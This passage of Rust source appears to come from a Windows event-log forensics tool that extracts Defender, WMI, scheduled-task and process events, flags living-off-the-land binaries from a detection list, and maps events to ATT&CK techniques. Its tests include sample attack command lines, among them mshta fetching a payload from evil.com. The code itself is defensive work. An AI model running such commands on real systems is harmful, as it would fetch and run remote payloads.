        events.push(DefenderEvent {
            timestamp: record.timestamp.to_string(),
            event_id,
            threat_name: event_data_str(ed, "Threat Name")
                .or_else(|| event_data_str(ed, "ThreatName"))
                .map(str::to_owned),
            severity: event_data_str(ed, "Severity Name")
                .or_else(|| event_data_str(ed, "SeverityName"))
                .map(str::to_owned),
            path: event_data_str(ed, "Path").map(str::to_owned),
            action_taken: event_data_str(ed, "Action Name")
                .or_else(|| event_data_str(ed, "ActionName"))
                .map(str::to_owned),
            process_name: event_data_str(ed, "Process Name")
                .or_else(|| event_data_str(ed, "ProcessName"))
                .map(str::to_owned),
        });
    }
    Ok(events)
}

// ── WMI events (EID 5857-5861) ────────────────────────────────────────────────

/// Extract WMI provider/subscription events from EID 5857, 5858, 5860, 5861.
pub fn wmi_events(path: &Path) -> Result<Vec<WmiEvent>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut events = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            // 5857/5858/5860/5861 = WMI-Activity operational log
            // 19/20/21 = Sysmon WMI persistence (WmiEventFilter/Consumer/ConsumerToFilter)
            Some(id) if matches!(id, 5857 | 5858 | 5860 | 5861 | 19 | 20 | 21) => id,
            _ => continue,
        };
        let event_node = record.data.get("Event");
        // WMI-Activity events (EID 5860/5861) use UserData → Operation_*
        // instead of EventData.  Fall back to the first child of UserData
        // when EventData is absent so consumer/filter fields are populated.
        let ed = event_node.and_then(|e| e.get("EventData")).or_else(|| {
            event_node
                .and_then(|e| e.get("UserData"))
                .and_then(|ud| ud.as_object())
                .and_then(|obj| obj.values().find(|v| v.is_object()))
        });
        let provider = system
            .and_then(|s| s.get("Provider"))
            .and_then(|p| p.get("@Name").or_else(|| p.get("@Guid")))
            .and_then(serde_json::Value::as_str)
            .map(str::to_owned);

        let (filter_name, consumer_name, query) = if let Some(ed) = ed {
            (
                // EID 5861 UserData: "ESS"; Sysmon EID 19: "Name"; EID 21: "Filter"
                event_data_str(ed, "ESS")
                    .or_else(|| event_data_str(ed, "FilterName"))
                    .or_else(|| event_data_str(ed, "PossibleCause"))
                    .or_else(|| {
                        // Sysmon EID 19 (WmiEventFilter) and EID 21 use "Name"/"Filter"
                        if matches!(event_id, 19 | 21) {
                            event_data_str(ed, "Name")
                                .or_else(|| event_data_str(ed, "Filter"))
                        } else {
                            None
                        }
                    })
                    .map(str::to_owned),
                // EID 5861 UserData: "CONSUMER"; Sysmon EID 20: "Name"; EID 21: "Consumer"
                event_data_str(ed, "CONSUMER")
                    .or_else(|| event_data_str(ed, "ConsumerName"))
                    .or_else(|| {
                        if matches!(event_id, 20 | 21) {
                            event_data_str(ed, "Name")
                                .or_else(|| event_data_str(ed, "Consumer"))
                        } else {
                            None
                        }
                    })
                    .map(str::to_owned),
                event_data_str(ed, "Query").map(str::to_owned),
            )
        } else {
            (None, None, None)
        };

        events.push(WmiEvent {
            timestamp: record.timestamp.to_string(),
            event_id,
            provider,
            filter_name,
            consumer_name,
            query,
        });
    }
    Ok(events)
}

// ── Scheduled tasks (EID 4698/4702) ───────────────────────────────────────────

/// Extract scheduled task events from EID 4698 (created) and EID 4702 (updated).
pub fn scheduled_tasks(path: &Path) -> Result<Vec<ScheduledTask>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut tasks = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id) if id == 4698 || id == 4702 => id,
            _ => continue,
        };
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };
        tasks.push(ScheduledTask {
            timestamp: record.timestamp.to_string(),
            event_id,
            task_name: event_data_str(ed, "TaskName").map(str::to_owned),
            task_content: event_data_str(ed, "TaskContent").map(str::to_owned),
            subject_user: event_data_str(ed, "SubjectUserName").map(str::to_owned),
        });
    }
    Ok(tasks)
}

// ── Process command lines (EID 4688) ─────────────────────────────────────────

const LOLBINS: &[&str] = &[
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "regsvr32.exe",
    "rundll32.exe",
    "certutil.exe",
    "msiexec.exe",
    "bitsadmin.exe",
    "forfiles.exe",
    "pcalua.exe",
];

fn is_lolbin(image: &str) -> bool {
    let lower = image.to_ascii_lowercase();
    let basename = lower.rsplit(['\\', '/']).next().unwrap_or(&lower);
    LOLBINS.contains(&basename)
}

/// Extract process command lines from Security EID 4688 and Sysmon EID 1,
/// with LOLBin tagging.
pub fn process_cmdlines(path: &Path) -> Result<Vec<ProcessExecution>, AnalyzeError> {
    let _ = std::fs::metadata(path).map_err(AnalyzeError::Io)?;
    let mut parser =
        evtx::EvtxParser::from_path(path).map_err(|e| AnalyzeError::Parse(e.to_string()))?;

    let mut execs = Vec::new();
    for result in parser.records_json_value() {
        let record = match result {
            Ok(r) => r,
            Err(_) => continue,
        };
        let system = record.data.get("Event").and_then(|e| e.get("System"));
        let event_id = match system.and_then(event_id_from_system) {
            Some(id @ (4688 | 1)) => id,
            _ => continue,
        };
        let ed = match record.data.get("Event").and_then(|e| e.get("EventData")) {
            Some(d) => d,
            None => continue,
        };
        let (image, command_line, pid, parent_pid, parent_image) = if event_id == 4688 {
            let image = event_data_str(ed, "NewProcessName").unwrap_or("-").to_owned();
            let cmdline = event_data_str(ed, "CommandLine").unwrap_or("").to_owned();
            let pid = event_data_str(ed, "NewProcessId")
                .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
                .unwrap_or(0);
            let ppid = event_data_str(ed, "ProcessId")
                .and_then(|s| u64::from_str_radix(s.trim_start_matches("0x"), 16).ok())
                .unwrap_or(0);
            let parent_image = event_data_str(ed, "ParentProcessName").map(str::to_owned);
            (image, cmdline, pid, ppid, parent_image)
        } else {
            // Sysmon EID 1 — flat JSON object format, integer PIDs
            let image = sysmon_str(ed, "Image").unwrap_or("-").to_owned();
            let cmdline = sysmon_str(ed, "CommandLine").unwrap_or("").to_owned();
            let pid = sysmon_pid(ed, "ProcessId");
            let ppid = sysmon_pid(ed, "ParentProcessId");
            let parent_image = sysmon_str(ed, "ParentImage").map(str::to_owned);
            (image, cmdline, pid, ppid, parent_image)
        };
        let lolbin = is_lolbin(&image);

        execs.push(ProcessExecution {
            timestamp: record.timestamp.to_string(),
            event_id,
            pid,
            parent_pid,
            image,
            command_line,
            parent_image,
            is_lolbin: lolbin,
        });
    }
    Ok(execs)
}

#[cfg(test)]
mod extraction_tests {
    use super::*;

    #[test]
    fn wmi_event_fields_are_accessible() {
        let e = WmiEvent {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 5861,
            provider: Some("WMI".to_string()),
            filter_name: Some("TestFilter".to_string()),
            consumer_name: Some("TestConsumer".to_string()),
            query: Some("SELECT * FROM __InstanceModificationEvent".to_string()),
        };
        assert_eq!(e.event_id, 5861);
        assert!(e.filter_name.is_some());
    }

    #[test]
    fn wmi_event_serializes_to_json() {
        let e = WmiEvent {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 5860,
            provider: None,
            filter_name: None,
            consumer_name: None,
            query: Some("SELECT * FROM __InstanceCreationEvent".to_string()),
        };
        let json = serde_json::to_string(&e).expect("serialize WmiEvent");
        assert!(json.contains("5860"));
    }

    #[test]
    fn wmi_events_nonexistent_path_returns_error() {
        let result = wmi_events(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn scheduled_task_fields_are_accessible() {
        let t = ScheduledTask {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4698,
            task_name: Some("\\Backdoor".to_string()),
            task_content: Some("<Task>...</Task>".to_string()),
            subject_user: Some("SYSTEM".to_string()),
        };
        assert_eq!(t.event_id, 4698);
        assert!(t.task_name.is_some());
    }

    #[test]
    fn scheduled_task_serializes_to_json() {
        let t = ScheduledTask {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4702,
            task_name: Some("\\TestTask".to_string()),
            task_content: None,
            subject_user: None,
        };
        let json = serde_json::to_string(&t).expect("serialize ScheduledTask");
        assert!(json.contains("4702"));
        assert!(json.contains("TestTask"));
    }

    #[test]
    fn scheduled_tasks_nonexistent_path_returns_error() {
        let result = scheduled_tasks(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn process_execution_fields_are_accessible() {
        let p = ProcessExecution {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4688,
            pid: 1234,
            parent_pid: 567,
            image: "C:\\Windows\\System32\\cmd.exe".to_string(),
            command_line: "cmd.exe /c whoami".to_string(),
            parent_image: Some("explorer.exe".to_string()),
            is_lolbin: false,
        };
        assert_eq!(p.pid, 1234);
        assert!(!p.is_lolbin);
    }

    #[test]
    fn process_execution_lolbin_detected() {
        let p = ProcessExecution {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4688,
            pid: 999,
            parent_pid: 1,
            image: "C:\\Windows\\System32\\mshta.exe".to_string(),
            command_line: "mshta.exe http://evil.com/payload.hta".to_string(),
            parent_image: None,
            is_lolbin: true,
        };
        assert!(p.is_lolbin);
    }

    #[test]
    fn process_execution_serializes_to_json() {
        let p = ProcessExecution {
            timestamp: "2017-12-08T12:00:00.000000Z".to_string(),
            event_id: 4688,
            pid: 1234,
            parent_pid: 567,
            image: "C:\\Windows\\System32\\wscript.exe".to_string(),
            command_line: "wscript.exe payload.vbs".to_string(),
            parent_image: None,
            is_lolbin: true,
        };
        let json = serde_json::to_string(&p).expect("serialize ProcessExecution");
        assert!(json.contains("is_lolbin"));
        assert!(json.contains("wscript.exe"));
    }

    #[test]
    fn process_cmdlines_nonexistent_path_returns_error() {
        let result = process_cmdlines(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }
}

// ── ATT&CK tests ─────────────────────────────────────────────────────────────

#[cfg(test)]
mod attack_tests {
    use super::*;

    #[test]
    fn unknown_event_id_returns_empty() {
        // EID 99999 has no mapping → empty slice
        let tags = attack_tags_for_event_id(99999);
        assert!(tags.is_empty(), "unknown EID should return no tags");
    }

    #[test]
    fn eid_4104_maps_to_powershell_technique() {
        // EID 4104 = PowerShell Script Block Logging → T1059.001
        let tags = attack_tags_for_event_id(4104);
        assert!(
            tags.iter().any(|t| t.technique_id == "T1059.001"),
            "EID 4104 should map to T1059.001 (PowerShell), got: {tags:?}"
        );
    }

    #[test]
    fn eid_4624_maps_to_valid_accounts() {
        // EID 4624 = An account was successfully logged on → T1078 (Valid Accounts)
        let tags = attack_tags_for_event_id(4624);
        assert!(
            tags.iter().any(|t| t.technique_id == "T1078"),
            "EID 4624 should map to T1078 (Valid Accounts), got: {tags:?}"
        );
    }

    #[test]
    fn eid_4625_maps_to_brute_force() {
        // EID 4625 = Account logon failure → T1110 (Brute Force)
        let tags = attack_tags_for_event_id(4625);
        assert!(
            tags.iter().any(|t| t.technique_id == "T1110"),
            "EID 4625 should map to T1110 (Brute Force), got: {tags:?}"
        );
    }

    #[test]
    fn eid_1102_maps_to_indicator_removal() {
        // EID 1102 = Security log cleared → T1070.001 (Clear Windows Event Logs)
        let tags = attack_tags_for_event_id(1102);
        assert!(
            tags.iter().any(|t| t.technique_id == "T1070.001"),
            "EID 1102 should map to T1070.001, got: {tags:?}"
        );
    }

    #[test]
    fn eid_4698_maps_to_scheduled_task() {
        // EID 4698 = A scheduled task was created → T1053.005
        let tags = attack_tags_for_event_id(4698);
        assert!(
            tags.iter().any(|t| t.technique_id == "T1053.005"),
            "EID 4698 should map to T1053.005 (Scheduled Task), got: {tags:?}"
        );
    }

    #[test]
    fn eid_7045_maps_to_windows_service() {
        // EID 7045 = New service installed → T1543.003 (Windows Service)
        let tags = attack_tags_for_event_id(7045);
        assert!(
            tags.iter().any(|t| t.technique_id == "T1543.003"),
            "EID 7045 should map to T1543.003 (Windows Service), got: {tags:?}"
        );
    }

    #[test]
    fn attack_tag_fields_are_non_empty() {
        let tags = attack_tags_for_event_id(4624);
        for tag in tags {
            assert!(
                !tag.technique_id.is_empty(),
                "technique_id should not be empty"
            );
            assert!(
                !tag.technique_name.is_empty(),
                "technique_name should not be empty"
            );
            assert!(!tag.tactic.is_empty(), "tactic should not be empty");
        }
    }

    #[test]
    fn attack_tag_serializes_to_json() {
        let tag = AttackTag {
            technique_id: "T1059.001".to_string(),
            technique_name: "PowerShell".to_string(),
            tactic: "Execution".to_string(),
        };
        let json = serde_json::to_string(&tag).expect("serialize AttackTag");
        assert!(json.contains("T1059.001"));
        assert!(json.contains("PowerShell"));
    }
}

// ── IOC tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod ioc_tests {
    use super::*;

    #[test]
    fn ioc_extract_nonexistent_path_returns_error() {
        let result = ioc_extract(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn ioc_kind_variants_are_distinct() {
        assert_ne!(IocKind::IpAddress, IocKind::Domain);
        assert_ne!(IocKind::Md5, IocKind::Sha256);
        assert_ne!(IocKind::FilePath, IocKind::IpAddress);
    }

    #[test]
    fn ioc_report_fields_are_accessible() {
        let r = IocReport {
            events_scanned: 100,
            iocs: vec![Ioc {
                value: "192.168.1.1".to_string(),
                kind: IocKind::IpAddress,
                count: 5,
                first_seen: Some("2017-12-08T12:00:00Z".to_string()),
                last_seen: Some("2017-12-08T13:00:00Z".to_string()),
                record_ids: vec![1, 2, 3],
            }],
        };
        assert_eq!(r.events_scanned, 100);
        assert_eq!(r.iocs[0].kind, IocKind::IpAddress);
        assert_eq!(r.iocs[0].count, 5);
    }

    #[test]
    fn ioc_report_serializes_to_json() {
        let r = IocReport {
            events_scanned: 50,
            iocs: vec![],
        };
        let json = serde_json::to_string(&r).expect("serialize IocReport");
        assert!(json.contains("events_scanned"));
    }

    fn foxitdata_path(filename: &str) -> std::path::PathBuf {
        let mut p = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        p.pop();
        p.pop();
        p.join("tests/data/fox-it-danderspritz").join(filename)
    }

    macro_rules! require_foxitdata {
        ($filename:expr) => {{
            let p = foxitdata_path($filename);
            if !p.exists() {
                eprintln!("SKIP: {} not found", p.display());
                return;
            }
            p
        }};
    }

    #[test]
    fn pre_security_ioc_extract_returns_report() {
        let path = require_foxitdata!("pre-Security.evtx");
        let report = ioc_extract(&path).expect("ioc_extract on pre-Security.evtx");
        assert!(report.events_scanned > 0, "should have scanned some events");
    }

    #[test]
    fn scan_for_iocs_detects_ipv4_address() {
        // The fox-it DanderSpritz corpus only contains loopback/placeholder IPs
        // (filtered), so we verify IP scanning via synthetic text.
        let hits = scan_for_iocs("connection from 10.0.0.42 to host 192.168.1.100");
        let ips: Vec<_> = hits
            .iter()
            .filter(|(k, _)| *k == IocKind::IpAddress)
            .collect();
        assert_eq!(ips.len(), 2, "should find both routable IPs");
        assert!(ips.iter().any(|(_, v)| v == "10.0.0.42"));
        assert!(ips.iter().any(|(_, v)| v == "192.168.1.100"));
    }

    // ── deobfuscate_ps ────────────────────────────────────────────────────────

    #[test]
    fn deobfuscate_ps_encoded_command_flag() {
        // "hello" encoded as UTF-16LE base64
        let result = deobfuscate_ps("powershell.exe -EncodedCommand aABlAGwAbABvAA==");
        assert_eq!(result, Some("hello".to_string()));
    }

    #[test]
    fn deobfuscate_ps_short_flag_ec() {
        let result = deobfuscate_ps("powershell -ec aABlAGwAbABvAA==");
        assert_eq!(result, Some("hello".to_string()));
    }

    #[test]
    fn deobfuscate_ps_no_encoding_returns_none() {
        let result = deobfuscate_ps("Get-Process | Where-Object CPU -gt 10");
        assert_eq!(result, None);
    }

    // ── anomaly + extract_field (error paths) ─────────────────────────────────

    #[test]
    fn anomaly_nonexistent_path_returns_error() {
        let result = anomaly(Path::new("/nonexistent/security.evtx"), 2.0);
        assert!(result.is_err());
    }

    #[test]
    fn extract_field_nonexistent_path_returns_error() {
        let result = extract_field(Path::new("/nonexistent/security.evtx"), "SubjectUserName");
        assert!(result.is_err());
    }

    #[test]
    fn powershell_eid4104_eventdata_structure_dump() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/Powershell-Invoke-Obfuscation-many.evtx");
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let mut parser = evtx::EvtxParser::from_path(&path).unwrap();
        for result in parser.records_json_value() {
            if let Ok(r) = result {
                let system = r.data.get("Event").and_then(|e| e.get("System"));
                if system.and_then(event_id_from_system) == Some(4104) {
                    let ed = r.data.get("Event").and_then(|e| e.get("EventData"));
                    eprintln!("EID 4104 EventData: {}", serde_json::to_string_pretty(&ed).unwrap());
                    return;
                }
            }
        }
        panic!("No EID 4104 found");
    }

    #[test]
    fn sysmon_eid1_eventdata_structure_dump() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/EVTX-ATTACK-SAMPLES/Execution/exec_sysmon_1_lolbin_pcalua.evtx");
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let mut parser = evtx::EvtxParser::from_path(&path).unwrap();
        for result in parser.records_json_value() {
            if let Ok(r) = result {
                let system = r.data.get("Event").and_then(|e| e.get("System"));
                if system.and_then(event_id_from_system) == Some(1) {
                    let ed = r.data.get("Event").and_then(|e| e.get("EventData"));
                    eprintln!("EventData: {}", serde_json::to_string_pretty(&ed).unwrap());
                    return;
                }
            }
        }
        panic!("No EID 1 found");
    }

    // ── lateral_movement (error paths + empty result) ─────────────────────────

    #[test]
    fn lateral_movement_nonexistent_path_returns_error() {
        let result = lateral_movement(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn lateral_movement_no_relevant_eids_returns_empty() {
        // Powershell-Invoke-Obfuscation-string-menu.evtx has only EID 4104 events —
        // none of 4648/4769/4776 — so lateral_movement should return Ok(vec![]).
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/Powershell-Invoke-Obfuscation-string-menu.evtx",
        );
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let result = lateral_movement(&path).expect("should succeed");
        assert!(result.is_empty(), "expected no lateral movement events");
    }

    // ── rdp_sessions (error paths + empty result) ─────────────────────────────

    #[test]
    fn rdp_sessions_nonexistent_path_returns_error() {
        let result = rdp_sessions(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn rdp_sessions_no_relevant_eids_returns_empty() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/Powershell-Invoke-Obfuscation-string-menu.evtx",
        );
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let result = rdp_sessions(&path).expect("should succeed");
        assert!(result.is_empty(), "expected no RDP session events");
    }

    // ── smb_access (error paths + empty result) ───────────────────────────────

    #[test]
    fn smb_access_nonexistent_path_returns_error() {
        let result = smb_access(Path::new("/nonexistent/security.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn smb_access_no_relevant_eids_returns_empty() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/Powershell-Invoke-Obfuscation-string-menu.evtx",
        );
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let result = smb_access(&path).expect("should succeed");
        assert!(result.is_empty(), "expected no SMB access events");
    }

    // ── defender_events (error paths + empty result) ──────────────────────────

    #[test]
    fn defender_events_nonexistent_path_returns_error() {
        let result = defender_events(Path::new("/nonexistent/defender.evtx"));
        assert!(result.is_err());
    }

    #[test]
    fn defender_events_no_relevant_eids_returns_empty() {
        // A PowerShell log has no Defender EIDs 1006/1116/1117.
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../tests/data/hayabusa-sample-evtx/DeepBlueCLI/Powershell-Invoke-Obfuscation-string-menu.evtx",
        );
        if !path.exists() {
            eprintln!("SKIP: corpus file not found");
            return;
        }
        let result = defender_events(&path).expect("should succeed");
        assert!(result.is_empty(), "expected no Defender events");
    }

    // ── Type-contract tests: extraction functions must return forensicnomicon types ──

    #[allow(dead_code)]
    fn _assert_lateral_movement_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::LateralMovementEvent>, AnalyzeError>
    {
        lateral_movement(p)
    }

    #[allow(dead_code)]
    fn _assert_rdp_sessions_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::RdpSessionEvent>, AnalyzeError>
    {
        rdp_sessions(p)
    }

    #[allow(dead_code)]
    fn _assert_smb_access_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::SmbAccessEvent>, AnalyzeError>
    {
        smb_access(p)
    }

    #[allow(dead_code)]
    fn _assert_defender_events_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::DefenderEvent>, AnalyzeError>
    {
        defender_events(p)
    }

    #[allow(dead_code)]
    fn _assert_wmi_events_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::WmiEvent>, AnalyzeError>
    {
        wmi_events(p)
    }

    #[allow(dead_code)]
    fn _assert_scheduled_tasks_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::ScheduledTask>, AnalyzeError>
    {
        scheduled_tasks(p)
    }

    #[allow(dead_code)]
    fn _assert_process_cmdlines_returns_forensicnomicon_type(p: &std::path::Path)
        -> Result<Vec<forensicnomicon::evtx::ProcessExecution>, AnalyzeError>
    {
        process_cmdlines(p)
    }

    // ── sessions_multi / logon_graph_multi (RED: functions not yet implemented) ──

    #[test]
    fn sessions_multi_empty_slice_returns_empty() {
        // sessions_multi does not exist yet → compile error (RED)
        let result = sessions_multi(&[]);
        assert!(result.is_ok());
        assert!(result.unwrap().is_empty());
    }

    #[test]
    fn sessions_multi_nonexistent_path_returns_error() {
        let result = sessions_multi(&[std::path::Path::new("/nonexistent/Security.evtx")]);
        assert!(result.is_err(), "single nonexistent path must error");
    }

    #[test]
    fn sessions_multi_single_path_matches_sessions() {
        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/fox-it-danderspritz/pre-Security.evtx");
        if !path.exists() { return; }
        let single = sessions(&path).expect("sessions should succeed");
        let multi  = sessions_multi(&[&path]).expect("sessions_multi should succeed");
        assert_eq!(multi.len(), single.len(),
            "sessions_multi with one path must equal sessions()");
    }

    #[test]
    fn sessions_multi_two_files_has_at_least_as_many_as_either_alone() {
        let pre  = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/fox-it-danderspritz/pre-Security.evtx");
        let post = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/fox-it-danderspritz/post-Security.evtx");
        if !pre.exists() || !post.exists() { return; }
        let n_pre  = sessions(&pre).unwrap().len();
        let n_post = sessions(&post).unwrap().len();
        let multi  = sessions_multi(&[&pre, &post]).expect("sessions_multi must succeed");
        assert!(multi.len() >= n_pre.max(n_post),
            "cross-file correlation must yield at least as many sessions as the larger file alone");
        assert!(multi.len() <= n_pre + n_post,
            "cross-file correlation must not invent sessions (upper bound)");
    }

    #[test]
    fn logon_graph_multi_empty_slice_returns_empty_graph() {
        // logon_graph_multi does not exist yet → compile error (RED)
        let g = logon_graph_multi(&[]).expect("empty slice must succeed");
        assert!(g.nodes.is_empty());
        assert!(g.edges.is_empty());
    }

    #[test]
    fn logon_graph_multi_two_files_superset_of_either_alone() {
        let pre  = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/fox-it-danderspritz/pre-Security.evtx");
        let post = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("../../tests/data/fox-it-danderspritz/post-Security.evtx");
        if !pre.exists() || !post.exists() { return; }
        let g_pre  = logon_graph(&pre).unwrap();
        let g_post = logon_graph(&post).unwrap();
        let g_multi = logon_graph_multi(&[&pre, &post]).expect("must succeed");
        // Every node from either file must appear in the merged graph.
        for node in g_pre.nodes.iter().chain(g_post.nodes.iter()) {
            assert!(g_multi.nodes.contains(node),
                "merged graph must contain node '{node}' from per-file graph");
        }
    }

    // ── EID 4624 WorkstationName vs IpAddress source disambiguation ──
    // Ahmed Thabit / Ahmed Abdo finding: for Logon Type 10 (RDP with NLA disabled),
    // WorkstationName = destination machine, NOT the source. IpAddress is always the source.

    #[test]
    fn rdp_type10_uses_ip_not_workstation_as_source() {
        // WorkstationName="DEST-MACHINE" is the RDP target; source is always IpAddress.
        let source = resolve_logon_source(10, "DEST-MACHINE", "10.10.10.13");
        assert_eq!(
            source.as_deref(),
            Some("10.10.10.13"),
            "Type 10 (RDP) must use IpAddress as source, not WorkstationName"
        );
    }

    #[test]
    fn network_type3_prefers_workstation_as_source() {
        let source = resolve_logon_source(3, "SOURCE-MACHINE", "10.10.10.13");
        assert_eq!(
            source.as_deref(),
            Some("SOURCE-MACHINE"),
            "Type 3 (Network/SMB) must prefer WorkstationName as source"
        );
    }

    #[test]
    fn network_type3_falls_back_to_ip_when_no_workstation() {
        let source = resolve_logon_source(3, "", "10.10.10.13");
        assert_eq!(source.as_deref(), Some("10.10.10.13"));
    }

    #[test]
    fn rdp_type10_with_no_usable_ip_returns_none() {
        // No IP and WorkstationName is destination — no source can be identified.
        let source = resolve_logon_source(10, "DEST-MACHINE", "-");
        assert!(source.is_none(), "Type 10 with no usable IP must return None");
    }

    #[test]
    fn rdp_type10_ignores_loopback_ip() {
        let source = resolve_logon_source(10, "DEST-MACHINE", "127.0.0.1");
        assert!(source.is_none(), "loopback must be filtered even for Type 10");
        let source6 = resolve_logon_source(10, "DEST-MACHINE", "::1");
        assert!(source6.is_none(), "IPv6 loopback must also be filtered");
    }

}
